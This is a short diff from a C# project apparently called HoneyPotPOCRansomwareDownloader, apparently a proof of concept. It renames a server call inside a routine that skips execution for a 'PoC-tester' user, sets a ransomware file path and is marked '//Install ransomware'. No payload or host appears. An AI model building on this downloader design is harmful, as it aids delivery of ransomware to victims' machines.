@@ -22,7 +22,7 @@ namespace HoneyPotPOCRansomwareDownloader
             if (Environment.UserName.Contains("PoC-tester")) return;
             Thread.Sleep(2000);
             serverCommunicator.setRansomwareFilePath();
-            serverCommunicator.getPoCRansomware();
+            serverCommunicator.getPOCHost();
             Console.WriteLine(serverCommunicator.getNAMEONTEST());
             Thread.Sleep(100);
             //Install ransomware
